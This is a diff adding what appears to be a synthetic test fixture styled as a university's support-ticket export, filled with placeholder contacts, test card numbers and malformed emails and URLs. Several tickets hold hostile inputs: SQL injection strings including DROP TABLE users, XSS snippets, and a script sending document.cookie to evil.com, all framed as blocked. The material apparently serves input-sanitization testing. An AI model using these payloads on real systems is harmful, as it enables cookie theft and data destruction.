@@ -1,0 +1,130 @@
+========================================================
+ AFRICAN LEADERSHIP UNIVERSITY — INTERNAL COMMUNICATIONS
+ Support Ticket System Export | Batch: 2024-Q4-PROD
+ Generated: 2024-11-15T08:32:10Z | Classification: INTERNAL
+========================================================
+
+--- TICKET #4821 | Priority: HIGH | Status: OPEN ---
+Submitted by: k.nakamura@alueducation.com
+Date: 2024-11-14 09:15:33
+
+Hi IT Support,
+
+I'm reaching out on behalf of the admissions team. We've been receiving applications
+through the portal at https://apply.alueducation.com/2025 and several emails are bouncing.
+
+The applicant list includes contacts like:
+  - john.doe@gmail.com
+  - amara.diallo@yahoo.fr
+  - chidi.okonkwo@hotmail.com (flagged — unusual activity)
+
+One applicant submitted a form with what looks like injected content in the phone field:
+  Phone: +1 (555) 867-5309 OR 1=1;--
+
+Please investigate. The applicant's real number is likely +1-800-555-0199.
+
+Also, the following alumni contacts need to be re-subscribed to the newsletter:
+  - p.adeyemi@alumni.alueducation.com
+  - r.chen@alumni.alueducation.com
+
+Invoice for renewal was sent to finance@alueducation.com and billing@si.alueducation.com.
+
+Best,
+K. Nakamura
+IT Liaison | +250 788 123 456
+
+
+--- TICKET #4822 | Priority: MEDIUM | Status: IN PROGRESS ---
+Submitted by: dev-alerts@si.alueducation.com
+Date: 2024-11-14 11:47:02
+
+AUTOMATED SYSTEM ALERT — Payment Gateway Anomaly Detected
+
+The following credit card transactions flagged during fraud screening:
+
+  Card ending: 4111 1111 1111 1111  (VISA — DECLINED)
+  Card ending: 5500 0000 0000 0004  (Mastercard — PENDING REVIEW)
+  Suspicious input detected: 4000-0000-0000-XXXX (INVALID FORMAT — BLOCKED)
+  Attempted injection: 4111111111111111' OR '1'='1 (BLOCKED — SQL INJECTION ATTEMPT)
+
+Transaction amounts involved:
+  $1,250.00  — Tuition installment
+  $89.99     — Course material fee
+  £450.00    — External certification (UK partner)
+  ₦75,000.00 — Scholarship disbursement (Nigeria)
+
+Vendor portal: https://payments.alueducation.com/gateway?ref=TXN-8821&status=review
+Fallback endpoint: http://legacy-pay.internal/checkout (deprecated, do not use)
+
+Contact for disputes: payments@alueducation.com
+Escalation: cfo@alueducation.com | Direct: +250 722 900 111
+
+
+--- TICKET #4823 | Priority: LOW | Status: RESOLVED ---
+Submitted by: m.osei@alueducation.com
+Date: 2024-11-14 14:05:59
+
+Social Media & Marketing — Hashtag Campaign Report
+
+Our #ALUMomentum campaign went live yesterday. Tracking the following tags:
+  #ALUMomentum #FutureLeaders #AfricanExcellence #ALU2025 #EdTechAfrica
+
+Top post timestamp: 2:45 PM  |  Scheduled post: 09:00 AM  |  Recap stream: 11:30 PM
+Backup time (24hr): 14:45  |  Batch job start: 00:15  |  Report generation: 23:59
+
+Post included the following HTML snippet (sanitize before render):
+  <script>alert('XSS Test')</script>
+  <p class="highlight">Applications are open for the class of 2026!</p>
+  <a href="https://www.alueducation.com/apply">Apply Now</a>
+  <img src="banner.png" alt="ALU 2025 Banner" />
+  <div onclick="stealCookies()">Click here</div>
+
+Influencer emails collected from form (raw, unvalidated):
+  not-an-email
+  missing@
+  @nodomain.com
+  valid.influencer+alu@partnerorg.net
+  UPPERCASE.VALID@CAMPAIGN.ORG
+  user@@double-at.com
+  spaces in@email.com
+  another_valid-one@media.co.ke
+
+LinkedIn page: https://linkedin.com/company/african-leadership-university
+Instagram: https://www.instagram.com/alueducation/
+Broken URL: htp://broken-link.org (typo — not a valid scheme)
+Suspicious: javascript:void(0) (must be blocked)
+Another bad one: file:///etc/passwd (local file reference — block immediately)
+
+Respectfully,
+M. Osei | Social Media Manager
+m.osei@alueducation.com | +1 (202) 555-0174
+
+
+--- TICKET #4824 | Priority: HIGH | Status: ESCALATED ---
+Submitted by: security@si.alueducation.com
+Date: 2024-11-15 07:22:41
+
+SECURITY INCIDENT REPORT — Attempted Data Exfiltration
+
+A penetration test revealed injection attempts across several fields:
+
+  Email field input:   admin'--@evil.com
+  Credit card field:   <script>document.location='http://evil.com?c='+document.cookie</script>
+  Phone field input:   +1 (555) 000-0000; DROP TABLE users;--
+  URL field input:     https://alueducation.com@evil.com/redirect
+
+Legitimate staff contact for follow-up:
+  t.bergstrom@alueducation.com
+  a.ibrahim@si.alueducation.com
+  g.nkosi@alumni.alueducation.com
+
+All suspicious entries above were blocked by the input sanitization layer.
+This report confirms the system is functioning as expected.
+
+Reference documentation: https://docs.alueducation.com/security/pen-test-report-Q4-2024.pdf
+Audit log endpoint: https://audit.si.alueducation.com/logs?from=2024-11-01&to=2024-11-15
+
+Time of detection: 6:58 AM  |  Alert sent: 07:00 AM  |  Escalated at: 07:22 AM
+
+---END OF BATCH EXPORT---
+System: alu-crm-prod-v3.2.1 | Checksum: a1b2c3d4e5f6
